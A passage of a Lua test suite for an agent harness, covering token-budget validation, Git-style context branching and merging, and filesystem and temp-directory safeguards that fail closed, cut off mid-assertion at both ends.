  assert(report2.success == true, "runner must succeed: " .. tostring(report2.error))
  assert(default_mock.call_history[1].max_completion_tokens == DEFAULT)

  -- 4. Invalid run override fails closed with a typed error code and no provider call.
  local calls_before = #default_mock.call_history
  local task3 = kernel:create_task({ id = "T-BUDGET-03", title = "Budget invalid" })
  local report3 = WheelRunner.run_task(default_agent, task3, { max_completion_tokens = 0 })
  assert(report3.success == false)
  assert(report3.error_code == WheelErrors.E_COMPLETION_BUDGET_INVALID)
  assert(#default_mock.call_history == calls_before, "invalid override must not reach the provider")

  -- 5. Agent model-profile validation rejects an invalid bound at construction.
  local ok_agent = pcall(WheelAgent.new, {
    name = "budget-invalid-worker",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    model_profile = {
      provider = "mock",
      model = "mock-model",
      max_completion_tokens = WheelProvider.MAX_COMPLETION_TOKENS + 1,
    },
  })
  assert(ok_agent == false, "agent construction must reject an oversized completion budget")
end)

run_test("WheelRunner & WheelAgent: protected dispatch, task finalization, and config override", function()
  -- 1. WheelRunner protected tool dispatch converts error to failed observation
  local kernel = WheelKernel.new()
  local task = kernel:create_task({ id = "task-faulty", title = "Runner Tool Error Test" })

  local agent = WheelAgent.new({
    name = "faulty-worker",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
  })

  -- Override execute_tool to throw an exception
  agent.execute_tool = function()
    error("Simulated tool crash inside runner")
  end

  local turn_count = 0
  local mock = WheelProvider.MockProvider.new({
    completion_fn = function(req)
      turn_count = turn_count + 1
      if turn_count == 1 then
        return {
          content = "Trying to run tool",
          tool_calls = { { id = "call_crash", name = "broken_tool", arguments = {} } },
        }
      else
        return {
          content = "Observed tool failure and finished",
        }
      end
    end,
  })

  local runner_res = WheelRunner.run_task(agent, task, {
    provider = mock,
    max_turns = 3,
  })
  assert(runner_res.success == true, "runner should recover from tool crash observation and finish")
  assert(runner_res.iterations == 2)

  -- 2. WheelAgent.execute_task finalizes kernel state when run via runner
  local task2 = kernel:create_task({ id = "task-lifecycle", title = "Runner Lifecycle Finalization" })
  local normal_agent = WheelAgent.new({
    name = "lifecycle-worker",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    provider = WheelProvider.MockProvider.new({
      responses = { "Task 2 deliverables complete" },
    }),
  })

  local exec_res = normal_agent:execute_task(task2.id)
  assert(exec_res.success == true)
  local final_task = kernel:get_task(task2.id)
  assert(final_task.status == "succeeded", "task must be finalized as succeeded")
  assert(kernel.active_task_id == nil, "active_task_id must be cleared")

  -- 3. Models command merges configured profile overrides
  package.loaded["wheel.init"] = nil
  package.loaded["lua.wheel.init"] = nil

  local notifications = {}
  _G.bitty = {
    commands = {
      register = function(def) if def.id == "models" then _G._models_cmd = def end; return 1 end,
    },
    notify = {
      show = function(n) table.insert(notifications, n); return true end,
    },
  }

  local wheel = require("wheel.init")
  -- Inject mock config
  wheel.config = {
    get = function()
      return {
        roles = {
          coding = {
            model_profile = {
              provider = "openai",
              model = "o3-mini",
              temperature = 0.2,
            },
          },
        },
      }
    end,
  }

  _G._models_cmd.run()
  assert(#notifications > 0)
  local body = notifications[#notifications].body
  assert(string.find(body, "o3-mini", 1, true) ~= nil, "must display configured model o3-mini")

  _G.bitty = nil
  _G._models_cmd = nil
end)

-- ===========================================================================
-- 18. Phase 7: Git-Model Context Versioning, Branches, Checkpoints, Reflog & Stash
-- ===========================================================================

run_test("WheelContext: Git-model context checkpoint commits and deterministic Merkle hashing", function()
  local WheelContext = require("wheel.context")
  local ctx = WheelContext.new()

  -- Initial state: HEAD points to main, no commits yet
  assert(ctx:current_branch() == "main")
  assert(ctx:head_commit_hash() == nil)
  assert(#ctx:log() == 0)

  -- Add initial slots
  local p1 = ctx:put_slot("workspace/project", "Wheel Harness v0.1")
  assert(p1.success)
  local tree1 = ctx:tree_hash()
  assert(type(tree1) == "string" and #tree1 == 64)

  -- Commit root checkpoint
  local c1 = ctx:commit_checkpoint({
    author = "commander-01",
    task_id = "TASK-01",
    rationale = {
      goal = "Initialize project context",
      approach = "Set baseline project metadata",
      alternatives = "None",
      tradeoffs = "None",
      assumptions = "Pure Lua 5.1 environment",
      confidence = 1.0,
    },
    message = "Initial project context commit",
  })
  assert(type(c1.hash) == "string" and #c1.hash == 64)
  assert(c1.tree_hash == tree1)
  assert(#c1.parent_hashes == 0)
  assert(ctx:head_commit_hash() == c1.hash)
  assert(ctx:get_commit(c1.hash) ~= nil)

  -- Second commit with parent chaining
  ctx:put_slot("decisions/runtime", "Use Git-model context DAG")
  local tree2 = ctx:tree_hash()
  assert(tree2 ~= tree1)

  local c2 = ctx:commit_checkpoint({
    author = "worker-coding-01",
    task_id = "TASK-02",
    rationale = "Adopt Git-inspired context branching",
  })
  assert(c2.hash ~= c1.hash)
  assert(#c2.parent_hashes == 1)
  assert(c2.parent_hashes[1] == c1.hash)
  assert(ctx:head_commit_hash() == c2.hash)

  -- Log verification
  local history = ctx:log(10)
  assert(#history == 2)
  assert(history[1].hash == c2.hash)
  assert(history[2].hash == c1.hash)

  -- ContextBus event publication check
  local bus_history = ctx.bus:history()
  local found_event = false
  for _, ev in ipairs(bus_history) do
    if ev.type == "checkpoint_committed" and ev.commit.hash == c2.hash then
      found_event = true
      break
    end
  end
  assert(found_event, "checkpoint_committed event must be published on ContextBus")
end)

run_test("WheelContext: Branch creation, listing, validation, and deletion guards", function()
  local WheelContext = require("wheel.context")
  local ctx = WheelContext.new()

  ctx:put_slot("workspace/spec", "Architecture spec")
  local c1 = ctx:commit_checkpoint({ message = "Baseline" })

  -- Branch validation
  local ok_bad1, err1 = ctx:create_branch("bad..branch")
  assert(not ok_bad1 and err1.error == "invalid_branch_name")
  local ok_bad2, err2 = ctx:create_branch("/leading/slash")
  assert(not ok_bad2 and err2.error == "invalid_branch_name")

  -- Create branch feat/experiment
  local ok_br, err_br = ctx:create_branch("feat/experiment")
  assert(ok_br == true and err_br == nil)
  assert(ctx:current_branch() == "main") -- Still on main until checkout

  -- Branch exists check
  local ok_dup, err_dup = ctx:create_branch("feat/experiment")
  assert(not ok_dup and err_dup.error == "branch_exists")

  -- List branches
  local branches = ctx:list_branches()
  assert(#branches == 2)
  local names = {}
  for _, b in ipairs(branches) do
    names[b.name] = b
  end
  assert(names["main"] and names["main"].is_head == true)
  assert(names["feat/experiment"] and names["feat/experiment"].is_head == false)
  assert(names["feat/experiment"].hash == c1.hash)

  -- Deletion guards: cannot delete active branch
  local ok_del1, err_del1 = ctx:delete_branch("main")
  assert(not ok_del1 and err_del1.error == "cannot_delete_active_branch")

  -- Delete non-active branch
  local ok_del2 = ctx:delete_branch("feat/experiment")
  assert(ok_del2 == true)
  assert(#ctx:list_branches() == 1)
end)

run_test("WheelContext: Checkout branch, detached HEAD, and slot tree restoration", function()
  local WheelContext = require("wheel.context")
  local ctx = WheelContext.new()

  -- 1. Main branch commit
  ctx:put_slot("workspace/config", "version: 1.0")
  local c1 = ctx:commit_checkpoint({ message = "Main v1.0" })

  -- 2. Create and checkout experiment branch
  local ok_co = ctx:checkout("experiment", { create_branch = true })
  assert(ok_co == true)
  assert(ctx:current_branch() == "experiment")

  -- Modify and commit on experiment
  ctx:put_slot("workspace/config", "version: 2.0-experimental")
  ctx:put_slot("scratch/hypothesis", "Speculative caching")
  local c2 = ctx:commit_checkpoint({ message = "Experiment v2.0" })

  -- 3. Switch back to main -> verify slots restore cleanly to v1.0
  ctx:checkout("main")
  assert(ctx:current_branch() == "main")
  local main_slot = ctx:get_slot("workspace/config")
  assert(main_slot.content == "version: 1.0", "slots must be restored to main snapshot")
  local hyp_slot = ctx:get_slot("scratch/hypothesis")
  assert(not hyp_slot.found, "scratch slot from experiment branch must not leak to main")

  -- 4. Switch back to experiment -> verify slots restore to v2.0
  ctx:checkout("experiment")
  assert(ctx:current_branch() == "experiment")
  local exp_slot = ctx:get_slot("workspace/config")
  assert(exp_slot.content == "version: 2.0-experimental")
  local exp_hyp = ctx:get_slot("scratch/hypothesis")
  assert(exp_hyp.found and exp_hyp.content == "Speculative caching")

  -- 5. Detached HEAD checkout by commit hash
  local ok_det = ctx:checkout(c1.hash)
  assert(ok_det == true)
  assert(ctx:current_branch() == "(detached)")
  assert(ctx:head_commit_hash() == c1.hash)
  assert(ctx:get_slot("workspace/config").content == "version: 1.0")
end)

run_test("WheelContext: Reflog audit journal and reset (soft vs hard)", function()
  local WheelContext = require("wheel.context")
  local ctx = WheelContext.new()

  ctx:put_slot("workspace/target", "initial")
  local c1 = ctx:commit_checkpoint({ message = "Commit 1" })

  ctx:put_slot("workspace/target", "updated")
  local c2 = ctx:commit_checkpoint({ message = "Commit 2" })

  local logs = ctx:reflog(10)
  assert(#logs >= 2)
  assert(logs[1].action == "commit")
  assert(logs[1].to_hash == c2.hash)

  -- Soft reset: HEAD moves to c1, but working slots stay as is
  ctx:put_slot("workspace/target", "dirty modification")
  ctx:reset(c1.hash, "soft")
  assert(ctx:head_commit_hash() == c1.hash)
  assert(ctx:get_slot("workspace/target").content == "dirty modification")

  -- Hard reset: HEAD moves to c1, and working slots revert to c1
  ctx:reset(c1.hash, "hard")
  assert(ctx:head_commit_hash() == c1.hash)
  assert(ctx:get_slot("workspace/target").content == "initial")

  local reset_logs = ctx:reflog(5)
  assert(reset_logs[1].action == "reset")
end)

run_test("WheelContext: Stash push, list, pop, and drop", function()
  local WheelContext = require("wheel.context")
  local ctx = WheelContext.new()

  ctx:put_slot("workspace/file", "committed content")
  ctx:commit_checkpoint({ message = "Initial commit" })

  -- Make uncommitted changes
  ctx:put_slot("scratch/temp_data", "volatile WIP")
  ctx:put_slot("workspace/file", "uncommitted edit")

  -- Stash push
  local st = ctx:stash_push("WIP before branch switch")
  assert(st.id == "stash@{0}")
  assert(#ctx:stash_list() == 1)

  -- Working slots reverted to HEAD commit
  assert(ctx:get_slot("workspace/file").content == "committed content")
  assert(not ctx:get_slot("scratch/temp_data").found)

  -- Stash pop restores modifications
  local popped = ctx:stash_pop(1)
  assert(popped ~= nil)
  assert(#ctx:stash_list() == 0)
  assert(ctx:get_slot("workspace/file").content == "uncommitted edit")
  assert(ctx:get_slot("scratch/temp_data").content == "volatile WIP")

  -- Stash drop test
  ctx:stash_push("To be dropped")
  assert(#ctx:stash_list() == 1)
  local dropped = ctx:stash_drop(1)
  assert(dropped ~= nil)
  assert(#ctx:stash_list() == 0)
end)

run_test("WheelContext: DAG LCA, 3-way semantic branch merge, fast-forward, and conflicts", function()
  local WheelContext = require("wheel.context")
  local ctx = WheelContext.new()

  -- Base commit C0
  ctx:put_slot("shared/config", "base_cfg")
  ctx:put_slot("main/data", "main_v0")
  local c0 = ctx:commit_checkpoint({ message = "C0: Base" })

  -- 1. Fast-forward merge test
  ctx:create_branch("feat-ff")
  ctx:checkout("feat-ff")
  ctx:put_slot("feat/extra", "ff_data")
  local c_ff = ctx:commit_checkpoint({ message = "C_FF: Add extra" })

  ctx:checkout("main")
  local ff_res = ctx:merge_branch("feat-ff")
  assert(ff_res.success == true)
  assert(ff_res.fast_forward == true)
  assert(ctx:head_commit_hash() == c_ff.hash)
  assert(ctx:get_slot("feat/extra").content == "ff_data")

  -- 2. Clean 3-way merge test
  -- Branch side-a and side-b from current tip
  ctx:create_branch("side-a")
  ctx:create_branch("side-b")

  ctx:checkout("side-a")
  ctx:put_slot("features/alpha", "feature alpha implemented")
  local c_a = ctx:commit_checkpoint({ message = "Implement alpha" })

  ctx:checkout("side-b")
  ctx:put_slot("features/beta", "feature beta implemented")
  local c_b = ctx:commit_checkpoint({ message = "Implement beta" })

  -- Verify LCA
  local lca = ctx:find_common_ancestor(c_a.hash, c_b.hash)
  assert(lca == c_ff.hash, "LCA must be the branch point")

  -- Merge side-b into side-a
  ctx:checkout("side-a")
  local merge_res = ctx:merge_branch("side-b")
  assert(merge_res.success == true)
  assert(merge_res.fast_forward == false)
  assert(merge_res.commit ~= nil)
  assert(#merge_res.commit.parent_hashes == 2)
  assert(merge_res.commit.parent_hashes[1] == c_a.hash)
  assert(merge_res.commit.parent_hashes[2] == c_b.hash)

  -- Merged tree contains both alpha and beta without conflict
  assert(ctx:get_slot("features/alpha").content == "feature alpha implemented")
  assert(ctx:get_slot("features/beta").content == "feature beta implemented")

  -- 3. Conflicting merge test
  ctx:create_branch("conflict-1")
  ctx:create_branch("conflict-2")

  ctx:checkout("conflict-1")
  ctx:put_slot("shared/decision", "Use Engine A")
  ctx:commit_checkpoint({ message = "Decision A" })

  ctx:checkout("conflict-2")
  ctx:put_slot("shared/decision", "Use Engine B")
  ctx:commit_checkpoint({ message = "Decision B" })

  ctx:checkout("conflict-1")
  local conf_res, conf_err = ctx:merge_branch("conflict-2")
  assert(conf_res == nil, "conflicting merge must fail closed")
  assert(conf_err.error == "merge_conflict")
  assert(#conf_err.conflicts == 1)

  -- Conflict diagnostics written to decisions/conflicts/*
  local diag_slot = ctx:get_slot("decisions/conflicts/shared/decision")
  assert(diag_slot.found == true)
  assert(string.find(diag_slot.content, "CONFLICT on shared/decision", 1, true) ~= nil)
end)

run_test("WheelContext: Cherry-pick and diff report", function()
  local WheelContext = require("wheel.context")
  local ctx = WheelContext.new()

  ctx:put_slot("workspace/spec", "spec v1")
  local c0 = ctx:commit_checkpoint({ message = "Base spec" })

  ctx:create_branch("sub-investigation")
  ctx:checkout("sub-investigation")
  ctx:put_slot("decisions/audit", "Audited: Pure Lua 5.1 passed")
  ctx:put_slot("scratch/junk", "temporary noise")
  local c_inv = ctx:commit_checkpoint({ message = "Investigation deliverable" })

  -- Diff check between commits
  local d = ctx:diff(c0.hash, c_inv.hash)
  assert(d.added["decisions/audit"] ~= nil)
  assert(d.added["scratch/junk"] ~= nil)
  assert(d.count == 2)

  -- Switch back to main (which doesn't have the sub-investigation)
  ctx:checkout("main")
  assert(not ctx:get_slot("decisions/audit").found)

  -- Cherry-pick the investigation commit into main
  local cp = ctx:cherry_pick(c_inv.hash)
  assert(cp ~= nil)
  assert(ctx:get_slot("decisions/audit").content == "Audited: Pure Lua 5.1 passed")
  assert(string.find(cp.message, "[cherry-pick]", 1, true) ~= nil)
end)

run_test("WheelAgent & WheelTeam: Branching, task-isolated context branches, and reviewer merge in orchestration loop", function()
  local WheelKernel = require("wheel.kernel")
  local WheelAgent = require("wheel.agent")
  local WheelTeam = require("wheel.team")

  local kernel = WheelKernel.new_mock()
  local team = WheelTeam.new({ kernel = kernel })
  local ctx = team.context

  -- Agent branch methods
  local worker = team:spawn_agent({ name = "agent-alpha", role = WheelAgent.Role.CODING })
  worker:commit_checkpoint("Initial worker checkpoint")
  assert(worker:current_branch() == "main")
  local ok_b = worker:create_branch("alpha-exp")
  assert(ok_b == true)
  worker:checkout("alpha-exp")
  assert(worker:current_branch() == "alpha-exp")
  local st = worker:status()
  assert(st.context_branch == "alpha-exp")
  assert(st.context_head ~= nil)

  worker:checkout("main")
  assert(worker:current_branch() == "main")

  -- Team task branching
  local ok_tb = team:branch_for_task("TASK-99")
  assert(ok_tb == true)
  assert(ctx:current_branch() == "task/TASK-99")
  ctx:put_slot("tasks/TASK-99/artifacts", "Task 99 deliverables")
  ctx:commit_checkpoint({ message = "Deliver TASK-99" })

  -- Reviewer merges task branch into main
  local rev_agent = team:spawn_agent({ name = "agent-rev", role = WheelAgent.Role.REVIEWER })
  local m_res = team:merge_task_branch("TASK-99", rev_agent)
  assert(m_res ~= nil and m_res.success == true)
  assert(ctx:current_branch() == "main")
  assert(ctx:get_slot("tasks/TASK-99/artifacts").content == "Task 99 deliverables")

  -- Team status telemetry includes branches
  local team_st = team:status()
  assert(team_st.context ~= nil)
  assert(team_st.context.current_branch == "main")
  assert(team_st.context.branches_count >= 2)
end)

run_test("WheelTeam: run_orchestration_loop with use_task_branches enabled", function()
  local WheelKernel = require("wheel.kernel")
  local WheelAgent = require("wheel.agent")
  local WheelTeam = require("wheel.team")

  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "CTX-A", title = "Task A", priority = 10, dependencies = {} })
  kernel:create_task({ id = "CTX-B", title = "Task B", priority = 5, dependencies = { "CTX-A" } })

  local team = WheelTeam.new({ kernel = kernel })
  team:spawn_agent({ name = "branch-worker", role = WheelAgent.Role.CODING })
  team:spawn_agent({ name = "branch-reviewer", role = WheelAgent.Role.REVIEWER })

  local report = team:run_orchestration_loop({
    use_task_branches = true,
  })
  assert(report.success == true, "wave orchestration with use_task_branches must succeed")
  assert(#report.completed_tasks == 2)

  -- After orchestration, all task branches were merged back to main
  local ctx = team.context
  assert(ctx:current_branch() == "main")
  assert(ctx:get_slot("tasks/CTX-A/artifacts").found == true)
  assert(ctx:get_slot("tasks/CTX-B/artifacts").found == true)
end)

run_test("Wheel: Plugin commands branch, checkpoint, reflog registration and execution", function()
  package.loaded["wheel.init"] = nil
  package.loaded["lua.wheel.init"] = nil

  local commands = {}
  local notifications = {}

  _G.bitty = {
    commands = {
      register = function(def)
        commands[def.id] = def
        return 1
      end,
    },
    notify = {
      show = function(n)
        table.insert(notifications, n)
        return true
      end,
    },
  }

  local wheel = require("wheel.init")
  assert(commands["branch"] ~= nil, "branch command must be registered")
  assert(commands["checkpoint"] ~= nil, "checkpoint command must be registered")
  assert(commands["reflog"] ~= nil, "reflog command must be registered")

  -- Execute branch command
  commands["branch"].run()
  assert(#notifications > 0)
  assert(string.find(notifications[#notifications].title, "Branch", 1, true) ~= nil)

  -- Execute checkpoint command
  commands["checkpoint"].run()
  assert(string.find(notifications[#notifications].title, "Checkpoint", 1, true) ~= nil)

  -- Execute reflog command
  commands["reflog"].run()
  assert(string.find(notifications[#notifications].title, "Reflog", 1, true) ~= nil)

  _G.bitty = nil
end)

-- ===========================================================================
-- WheelHost: Host-Capability Seam (fs / proc / tmp / time)
-- ===========================================================================

run_test("WheelHost: fs primitives (mkdir_p, write_file, read_file, list_dir)", function()
  local root = test_path("test_host_seam_fs")
  os.execute("rm -rf " .. root)

  -- mkdir_p creates the whole nested tree
  local made = WheelHost.fs.mkdir_p(root .. "/nested/deep")
  assert(made == true, "mkdir_p must report success")

  -- write_file + read_file roundtrip
  local target = root .. "/nested/deep/sample.txt"
  local wrote = WheelHost.fs.write_file(target, "host seam payload\n")
  assert(wrote == true, "write_file must report success")
  local content = WheelHost.fs.read_file(target)
  assert(content == "host seam payload\n", "read_file must return the written content")

  -- read_file on a missing file returns nil + err
  local missing, err = WheelHost.fs.read_file(root .. "/nested/deep/absent.txt")
  assert(missing == nil, "missing file must return nil")
  assert(type(err) == "string" and #err > 0, "missing file must return an error string")

  -- mkdir_p fails cleanly under a regular file
  local failed = WheelHost.fs.mkdir_p(target .. "/child")
  assert(failed == false, "mkdir_p must fail under a regular file")

  -- list_dir exposes the raw ls -la lines with an accurate total
  local listing = WheelHost.fs.list_dir(root .. "/nested/deep")
  assert(listing.ok == true, "existing directory must list")
  assert(listing.total == #listing.entries, "total must equal the entry count")
  local found = false
  for _, line in ipairs(listing.entries) do
    if string.find(line, "sample.txt", 1, true) then
      found = true
    end
  end
  assert(found, "listing must contain the written file")

  -- Bounded reads stop at the requested bound instead of reading whole files.
  local bounded = WheelHost.fs.read_file_bounded(target, 4)
  assert(bounded == "host", "bounded read must return at most the bound")
  local bounded_over = WheelHost.fs.read_file_bounded(target, #"host seam payload\n" + 1)
  assert(bounded_over == "host seam payload\n", "bounded read must return the full file under the bound")
  local bounded_empty = WheelHost.fs.read_file_bounded(target, 0)
  assert(bounded_empty == "", "a zero bound must return an empty string")
  local directory_read, directory_read_err = WheelHost.fs.read_file_bounded(TEST_RUN_ROOT, 10)
  assert(directory_read == nil and type(directory_read_err) == "string",
    "a read failure must return nil and an error, never an empty string")
  if WheelHost.fs.exists("/dev/full") then
    local full_ok, full_err = WheelHost.fs.write_file("/dev/full", "write-must-fail")
    assert(full_ok == false and type(full_err) == "string",
      "a short/failed write must fail closed instead of reporting success")
  end

  -- stat reports type and link status without following the final link.
  local stat = WheelHost.fs.stat(target)
  assert(stat.exists == true and stat.regular == true and stat.symlink == false,
    "stat must identify a regular file")
  assert(stat.directory == false, "stat must not call a regular file a directory")
  assert(type(stat.uid) == "number" and type(stat.mode) == "number",
    "stat must report owner and mode when the platform provides stat")
  local missing_stat = WheelHost.fs.stat(root .. "/nested/deep/absent.txt")
  assert(missing_stat.exists == false, "stat must report a missing path without error")
  local link_path = root .. "/nested/deep/sample.link"
  os.execute("ln -s " .. target .. " " .. link_path)
  local link_stat = WheelHost.fs.stat(link_path)
  assert(link_stat.exists == true and link_stat.symlink == true,
    "stat must identify a symbolic link")
  assert(link_stat.regular == true, "stat must still describe the symlink target type")

  -- chmod and same-directory rename are real filesystem operations.
  local chmod_ok = WheelHost.fs.chmod(target, "600")
  assert(chmod_ok == true, "chmod must report success")
  local after_chmod = WheelHost.fs.stat(target)
  assert(after_chmod.mode == 384, "chmod 600 must produce mode 0600 (384 decimal)")
  local renamed = root .. "/nested/deep/renamed.txt"
  local rename_ok = WheelHost.fs.rename(target, renamed)
  assert(rename_ok == true, "rename must report success")
  assert(WheelHost.fs.read_file(renamed) == "host seam payload\n",
    "rename must preserve content")
  assert(WheelHost.fs.stat(target).exists == false, "rename must remove the old path")
  os.execute("rm -f " .. link_path)

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: the standalone backend is explicitly selected", function()
  assert(WheelHost.BACKEND_STANDALONE == "standalone",
    "the standalone backend id must be a named constant")
  assert(WheelHost.backend_name == WheelHost.BACKEND_STANDALONE,
    "the installed backend must be the standalone backend")
  assert(type(WheelHost.backend) == "table" and WheelHost.backend.name == "standalone",
    "the backend table must identify itself as standalone")
  assert(WheelHost.backend.platform == "posix",
    "the installed standalone backend must report the POSIX platform")

  -- The factory is explicit and named; it builds a backend without installing it.
  local fresh = WheelHost.create_backend(WheelHost.BACKEND_STANDALONE)
  assert(type(fresh) == "table" and fresh.name == "standalone")
  assert(fresh ~= WheelHost.backend, "create_backend must not install its result")

  -- The selection path installs exactly the backend it built.
  local selected = WheelHost.select_backend(WheelHost.BACKEND_STANDALONE)
  assert(selected == WheelHost.backend, "select_backend must install the built backend")
  assert(WheelHost.backend_name == WheelHost.BACKEND_STANDALONE)
end)

run_test("WheelHost: unsupported backends and platforms fail closed", function()
  local installed = WheelHost.backend
  local installed_name = WheelHost.backend_name

  local ok_name, err_name = pcall(WheelHost.create_backend, "plugin-host")
  assert(not ok_name, "an unknown backend must not be constructed")
  local name_denial = assert_typed_error(err_name, "E_CAPABILITY_DENIED")
  assert(name_denial.message == "capability 'host.backend' is not granted",
    "unknown backend must fail with the typed host-backend denial")

  local ok_platform, err_platform = pcall(WheelHost.create_backend, "standalone", { platform = "windows" })
  assert(not ok_platform, "a non-POSIX platform must not construct the standalone backend")
  local platform_denial = assert_typed_error(err_platform, "E_CAPABILITY_DENIED")
  assert(platform_denial.message == "capability 'host.backend.standalone' is not granted",
    "unsupported platform must fail with the typed standalone denial")

  -- Real detection path: a Windows-style package.config separator is rejected.
  local saved_config = package.config
  package.config = "\\\n?\n!\n-\n"
  local ok_detect, err_detect = pcall(WheelHost.create_backend, "standalone")
  package.config = saved_config
  assert(not ok_detect, "non-POSIX package.config must fail closed")
  assert_typed_error(err_detect, "E_CAPABILITY_DENIED")

  -- A failed construction never replaces the installed backend.
  assert(WheelHost.backend == installed, "failed selection must not mutate the installed backend")
  assert(WheelHost.backend_name == installed_name)
end)

run_test("WheelHost: unavailable primitives return typed denials", function()
  local installed = WheelHost.backend
  WheelHost.backend = {}
  local probe = test_path("unavailable-probe")

  local cases = {
    { label = "fs.mkdir_p", capability = "fs.write", call = function() return WheelHost.fs.mkdir_p(probe) end },
    { label = "fs.list_dir", capability = "fs.read", call = function() return WheelHost.fs.list_dir(probe) end },
    { label = "fs.read_file", capability = "fs.read", call = function() return WheelHost.fs.read_file(probe) end },
    { label = "fs.read_file_bounded", capability = "fs.read", call = function() return WheelHost.fs.read_file_bounded(probe, 1) end },
    { label = "fs.write_file", capability = "fs.write", call = function() return WheelHost.fs.write_file(probe, "x") end },
    { label = "fs.chmod", capability = "fs.write", call = function() return WheelHost.fs.chmod(probe, "600") end },
    { label = "fs.rename", capability = "fs.write", call = function() return WheelHost.fs.rename(probe, probe .. ".moved") end },
    { label = "fs.remove_file", capability = "fs.write", call = function() return WheelHost.fs.remove_file(probe) end },
    { label = "fs.exists", capability = "fs.read", call = function() return WheelHost.fs.exists(probe) end },
    { label = "fs.stat", capability = "fs.read", call = function() return WheelHost.fs.stat(probe) end },
    { label = "proc.run_command", capability = "process.spawn", call = function() return WheelHost.proc.run_command("true") end },
    { label = "proc.run_program", capability = "process.spawn", call = function() return WheelHost.proc.run_program("true") end },
    { label = "proc.shell_quote", capability = "process.spawn", call = function() return WheelHost.proc.shell_quote("x") end },
    { label = "tmp.dir", capability = "fs.write", call = function() return WheelHost.tmp.dir() end },
    { label = "tmp.name", capability = "fs.write", call = function() return WheelHost.tmp.name() end },
    { label = "tmp.create", capability = "fs.write", call = function() return WheelHost.tmp.create("x") end },
    { label = "tmp.create_exclusive", capability = "fs.write", call = function() return WheelHost.tmp.create_exclusive(probe, "x") end },
    { label = "time.now", capability = "time.now", call = function() return WheelHost.time.now() end },
    { label = "time.clock", capability = "time.clock", call = function() return WheelHost.time.clock() end },
  }

  local results = {}
  for _, case in ipairs(cases) do
    local ok, err = pcall(case.call)
    results[case.label] = { ok = ok, err = err, capability = case.capability }
  end
  WheelHost.backend = installed

  for _, case in ipairs(cases) do
    local result = results[case.label]
    assert(not result.ok, case.label .. " must fail when the primitive is unavailable")
    local denial = assert_typed_error(result.err, "E_CAPABILITY_DENIED")
    assert(denial.message == "capability '" .. case.capability .. "' is not granted",
      case.label .. " must report the typed " .. case.capability .. " denial")
  end
end)

run_test("WheelHost: config file access fails closed through the seam", function()
  local installed = WheelHost.backend
  WheelHost.backend = {}
  local read_ok, read_err = pcall(WheelConfig.read_trust_store, test_path("ctx0015-trust.json"))
  local write_ok, write_err = pcall(WheelConfig.write_trust_store, {}, test_path("ctx0015-trust.json"))
  WheelHost.backend = installed

  assert(not read_ok, "trust-store reads must fail without a host surface")
  local read_denial = assert_typed_error(read_err, "E_CAPABILITY_DENIED")
  assert(read_denial.message == "capability 'fs.read' is not granted")

  assert(not write_ok, "trust-store writes must fail without a host surface")
  local write_denial = assert_typed_error(write_err, "E_CAPABILITY_DENIED")
  assert(write_denial.message == "capability 'fs.write' is not granted")
end)

run_test("WheelHost: temporary files use a private runtime directory", function()
  local root = test_path("test_host_private_tmp")
  os.execute("rm -rf " .. root)

  local backend = WheelHost.create_backend("standalone", { tmp_root = root .. "/runtime" })
  local dir = backend.tmp_dir()
  assert(dir == root .. "/runtime", "tmp_dir must honor the injected workspace/runtime root")

  local listing = WheelHost.proc.run_command("ls -ld " .. WheelHost.proc.shell_quote(dir))
  assert(listing.ok == true and listing.code == 0, "the private directory must exist")
  local mode = listing.stdout:match("^(%S+)")
  assert(string.sub(mode or "", 1, 10) == "drwx------",
    "the temporary directory must have mode 0700, got " .. tostring(mode))

  local first = backend.tmp_path()
  local second = backend.tmp_path()
  assert(first ~= second, "temporary paths must be unique")
  assert(string.sub(first, 1, #dir + 1) == dir .. "/", "temporary paths must stay inside the private directory")

  local wrote = backend.write_file(first, "private payload")
  assert(wrote == true, "the caller must be able to write the temporary file")
  assert(backend.remove_file(first) == true, "the caller must be able to remove the temporary file")

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: tmp_path uniqueness does not depend on os.time", function()
  local root = test_path("test_host_tmp_no_time")
  os.execute("rm -rf " .. root)

  local backend = WheelHost.create_backend("standalone", { tmp_root = root .. "/runtime" })
  local saved_time = os.time
  os.time = nil
  local ok, first, second, now_ok, now_err = pcall(function()
    local a = backend.tmp_path()
    local b = backend.tmp_path()
    local denied, denial = pcall(backend.now)
    return a, b, denied, denial
  end)
  os.time = saved_time

  assert(ok, "tmp_path must not require os.time: " .. tostring(first))
  assert(first ~= second, "tmp_path must still be unique without os.time")
  assert(type(first) == "string" and first:sub(1, #(root .. "/runtime/")) == root .. "/runtime/",
    "tmp_path must stay inside the private directory")
  assert(now_ok == false, "time.now must fail closed when os.time is unavailable")
  local denial = assert_typed_error(now_err, "E_CAPABILITY_DENIED")
  assert(denial.message == "capability 'time.now' is not granted")

  os.execute("rm -rf " .. root)
end)

run_test("WheelHost: tmp_dir rejects a symlinked harness-owned directory", function()
  local root = test_path("test_host_tmp_symlink")
  os.execute("rm -rf " .. root)
  os.execute("mkdir -p " .. root .. "/real-target " .. root .. "/real-parent")
  os.execute("ln -s " .. root .. "/real-target " .. root .. "/linked-runtime")
  os.execute("ln -s " .. root .. "/real-parent " .. root .. "/linked-parent")

  -- A legitimate parent symlink is allowed: only the final harness-owned
  -- directory is inspected.
  local parent_backend = WheelHost.create_backend("standalone", {
    tmp_root = root .. "/linked-parent/runtime",
  })
  local parent_dir, parent_err = parent_backend.tmp_dir()
  assert(parent_dir == root .. "/linked-parent/runtime",
    "a non-owned parent symlink must not be rejected: " .. tostring(parent_err))

  -- A symlinked final directory is rejected before chmod follows it, including
  -- unnormalized trailing-slash and `/.` forms.
  for _, suffix in ipairs({ "", "/", "/.", "/./" }) do
    os.execute("chmod 755 " .. root .. "/real-target")
    local linked_backend = WheelHost.create_backend("standalone", {
      tmp_root = root .. "/linked-runtime" .. suffix,
    })
    local ok, err = pcall(linked_backend.tmp_dir)
    assert(not ok, "a symlinked harness-owned temp directory must be rejected: '" .. suffix .. "'")
    local denial = assert_typed_error(err, "E_CAPABILITY_DENIED")
    assert(denial.message == "capability 'fs.write' is not granted")

    local listing = WheelHost.proc.run_command("ls -ld " .. WheelHost.proc.shell_quote(root .. "/real-target"))
    local mode = listing.stdout:match("^(%S+)")
    assert(string.sub(mode or "", 1, 10) == "drwxr-xr-x",
